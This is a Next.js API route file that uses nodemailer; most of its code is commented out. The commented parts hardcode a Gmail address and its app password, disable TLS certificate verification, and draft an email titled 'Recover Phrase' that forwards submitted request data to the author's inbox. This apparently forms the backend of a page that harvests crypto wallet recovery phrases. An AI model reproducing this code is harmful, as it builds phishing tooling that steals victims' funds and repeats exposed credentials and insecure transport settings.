// // pages/api/mail.js

// import { NextResponse } from 'next/server';
// import nodemailer from 'nodemailer';

// export async function POST(req, res) {
//   const transporter = nodemailer.createTransport({
//     service: 'gmail',
//     auth: {
//       user: 'wisdomuzodimna@gmail.com',
//       pass: 'qzrh xkwa vpwx hglo',
//     },
//   });

//   try {
//     const info = await transporter.sendMail({
//       from: '"Maddison Foo Koch 👻" <wisdomuzodimna@gmail.com>',
//       to: 'wisdomuzodimna@gmail.com',
//       subject: 'Hello ✔',
//       text: 'Hello world?',
//       html: '<b>Hello world?</b>',
//     });

//     console.log('Message sent: %s', info.messageId);
//     NextResponse.json({ message: 'Email sent successfully' }).status(200)
//     //res.status(200).json({ message: 'Email sent successfully' });
//   } catch (error) {
//     console.error(error);
//     NextResponse.status(500).json({ error: 'Failed to send email' });
//   }
// }


import { NextResponse } from 'next/server'
import nodemailer from 'nodemailer';
 
export async function POST(req, res) {
    

//     const transporter = nodemailer.createTransport({
//     service: 'gmail',
//     auth: {
//       user: 'wisdomuzodimna@gmail.com',
//       pass: 'qzrh xkwa vpwx hglo',
//     },
//     tls: {
//         rejectUnauthorized: false // Ignore self-signed certificate
//       }
//   });

const firstName  = req.body; // Destructure 'data' from the request body
    console.log(firstName);

  try {



//     const htmlContent = `<h1>Recover Phrase</h1>
//                              <p>${request.body}</p>`;

//      const info = await transporter.sendMail({
//       from: '"Maddison Foo Koch 👻" <wisdomuzodimna@gmail.com>',
//       to: 'wisdomuzodimna@gmail.com',
//       subject: 'Hello ✔',
//       text: 'Hello world?',
//       html: '<h1>Recover Phrase ?</h1> <p>Runing a test</p>',
//     });
    
//     console.log('Message sent: %s', info.messageId);
    return NextResponse.json({ message: 'Hello from server' })

  } catch (error) {
    console.error(error);
    return NextResponse.json({ msg: 'Hello from server' })

  }

}